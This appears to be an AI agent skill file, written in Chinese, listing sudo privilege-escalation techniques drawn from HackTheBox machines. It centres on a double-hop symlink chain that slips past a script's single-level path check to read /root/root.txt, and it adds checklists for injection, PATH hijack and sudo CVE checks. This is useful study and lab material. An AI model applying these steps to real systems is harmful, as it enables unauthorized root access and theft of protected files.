---
name: 'sudo-escape-techniques'
description: 'Sudo Escape 全集 + 🆕 双跳符号链接绕过脚本路径验证'
disable-model-invocation: true
metadata: { domain: linux, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Sudo Escape 技术全集

> HTB 统计: Easy 18台 + Medium 15台 + Hard/Insane 大量 = **最常用的 Linux 提权向量**

## 决策矩阵: sudo -l 结果 → 提权路径

```bash
sudo -l
# 分析输出，对号入座:
```

## 1. Shell Escape (sudo 给 shell) + GTFOBins 矩阵

（见旧版，保持不变）

## 2. Custom Script / Config 类 — sudo 到脚本 + 可控输入

```
模式: sudo /path/to/script.sh <attacker_params>

检查:
[ ] 脚本读 $1/$2 → 注入？
[ ] 脚本读环境变量 → PYTHONPATH/PATH hijack？
[ ] 脚本读配置文件 → 写恶意配置？
[ ] 脚本里的路径引用 → symlink attack？
[ ] 脚本用 eval/system → 命令注入？

HTB 案例:
- Code: sudo backy.sh config → JSON path traversal → 读 /root
- DevArea: sudo syswatch.sh logs <file> → 双跳 symlink → 读 /root/root.txt
- PermX: sudo ACL script → symlink /etc/sudoers
```

### 🆕 2.1 双跳符号链接绕过路径验证

**场景**: sudo 脚本检查了第一层 symlink 的 target 是否安全（不含 `/`、`..`），但 `cat` 会跟踪整个 symlink 链。

**模式**:
```bash
# 直接 symlink 被拦截（target 含 /）
ln -sf /root/root.txt /opt/logs/escape.log
sudo script.sh logs escape.log
# → "Blocked unsafe symlink target"

# 双跳绕过：第一层指向简单文件名，第二层指向真实目标
ln -sf /root/root.txt /opt/logs/service.log           # 第二层（底层）
ln -sf service.log /opt/logs/network.log              # 第一层（表层，target="service.log" 通过检查）
sudo script.sh logs network.log                       # cat 自动跟踪全链 → 读 /root/root.txt
```

**适用条件**:
1. 脚本对 symlink 做安全检查，但只检查第一层 target
2. 脚本最终用 `cat` 或类似命令读取文件（自动解析 symlink）
3. 你有权在目标目录创建文件和 symlink（通常通过另一个漏洞获得）

**真实案例**: DevArea — syswatch 命令注入 → syswatch 用户创建双跳链 → sudo logs 读 root flag

**为什么有效**: `view_logs()` 只验证 `readlink()` 的第一层输出是否包含 `/`，然后调用 `cat`。Linux 内核的 VFS 层自动跟踪所有 symlink 层，`cat` 最终到达原始目标文件。

## 3-7. LD_PRELOAD / Sudo CVE / Token Reuse（见旧版）

## 快速检查清单

```bash
[ ] sudo -l — 列出所有允许的命令
[ ] 每个命令 — 对照 GTFOBins (gtfobins.github.io)
[ ] 检查 env_keep: sudo -l | grep -i env
[ ] 检查通配符: sudo -l 中有 * ？→ 参数可控？
[ ] sudo --version → CVE 检查
[ ] 🆕 脚本读文件？→ 检查 symlink 验证逻辑 → 能否双跳？
```
